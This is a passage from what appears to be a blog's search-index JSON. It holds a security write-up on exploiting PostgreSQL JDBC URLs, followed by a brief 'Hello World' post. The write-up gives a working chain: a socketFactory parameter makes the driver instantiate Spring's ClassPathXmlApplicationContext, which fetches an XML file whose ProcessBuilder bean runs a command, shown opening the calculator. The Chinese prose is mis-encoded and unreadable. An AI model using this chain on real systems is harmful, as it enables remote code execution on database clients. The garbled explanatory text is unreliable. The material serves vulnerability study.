è½½URLï¼Œæ— æ³•ç›´æ¥å°†XMLä¼ å…¥ï¼Œæˆ‘ä»¬é€šå¸¸è®¤ä¸ºéœ€è¦åŠ è½½è¿œç¨‹XMLæ–‡ä»¶ï¼Œæˆ–è€…å…ˆé€šè¿‡æœ¬åœ°å†™æ–‡ä»¶æ‰èƒ½åˆ©ç”¨ã€‚â€</a></p>\n<ul>\n<li><p>org.springframework.context.support.ClassPathXmlApplicationContext</p>\n</li>\n<li><p>org.springframework.context.support.FileSystemXmlApplicationContext</p>\n<p>è¿™é‡Œclassnameæ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚</p>\n</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title function_\">instantiate</span><span class=\"params\">(String classname, Properties info, <span class=\"type\">boolean</span> tryString, String stringarg)</span> <span class=\"keyword\">throws</span> ClassNotFoundException, SecurityException, NoSuchMethodException, IllegalArgumentException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class=\"line\">        Object[] args = <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;info&#125;;</span><br><span class=\"line\">        Constructor&lt;?&gt; ctor = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        Class&lt;?&gt; cls = Class.forName(classname);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            ctor = cls.getConstructor(Properties.class);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException var9) &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (tryString &amp;&amp; ctor == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                ctor = cls.getConstructor(String.class);</span><br><span class=\"line\">                args = <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;stringarg&#125;;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException var8) &#123;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ctor == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            ctor = cls.getConstructor();</span><br><span class=\"line\">            args = <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ctor.newInstance(args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>?socketFactory&#x3D;æ¶æ„ç±»å&amp;socketFactoryArg&#x3D;å…¶æ„é€ å™¨çš„å‚æ•°ã€‚pythonèµ·æœåŠ¡ï¼Œæ”¾å…¥xmlï¼Œå†è¿è¡Œï¼ŒæˆåŠŸå¼¹è®¡ç®—å™¨ã€‚</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> SQLException &#123;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">jdbcUrl</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://localhost/2.xml&quot;</span>;</span><br><span class=\"line\">    DriverManager.getConnection(jdbcUrl);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;pb&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;java.lang.ProcessBuilder&quot;</span> <span class=\"attr\">init-method</span>=<span class=\"string\">&quot;start&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> &gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>open<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>-a<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>calculator<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">constructor-arg</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/8.png\" alt=\"image-20250724170036442\"></p>\n<p>sslFactoryä¹Ÿæ˜¯å·®ä¸å¤šçš„æµç¨‹ï¼Œéƒ½æ˜¯åœ¨instantiateæ–¹æ³•ä¸­å¯æ§å®ä¾‹åŒ–å¯¹è±¡ã€‚</p>\n"},{"title":"Hello World","url":"/2025/07/16/hello-world/","content":"<h1 id=\"ç”±äºä¹°ä¸èµ·é˜¿é‡Œäº‘ä¸»æœºï¼Œå†³å®šåœ¨githubé‡ç”Ÿå½’æ¥ï¼Œè¿™ä¸€ä¸–ï¼Œæˆ‘è¦â€¦\"><a href=\"#ç”±äºä¹°ä¸èµ·é˜¿é‡Œäº‘ä¸»æœºï¼Œå†³å®šåœ¨githubé‡ç”Ÿå½’æ¥ï¼Œè¿™ä¸€ä¸–ï¼Œæˆ‘è¦â€¦\" class=\"headerlink\" title=\"ç”±äºä¹°ä¸èµ·é˜¿é‡Œäº‘ä¸»æœºï¼Œå†³å®šåœ¨githubé‡ç”Ÿå½’æ¥ï¼Œè¿™ä¸€ä¸–ï¼Œæˆ‘è¦â€¦\"></a>ç”±äºä¹°ä¸èµ·é˜¿é‡Œäº‘ä¸»æœºï¼Œå†³å®šåœ¨githubé‡ç”Ÿå½’æ¥ï¼Œè¿™ä¸€ä¸–ï¼Œæˆ‘è¦â€¦</h1>"}]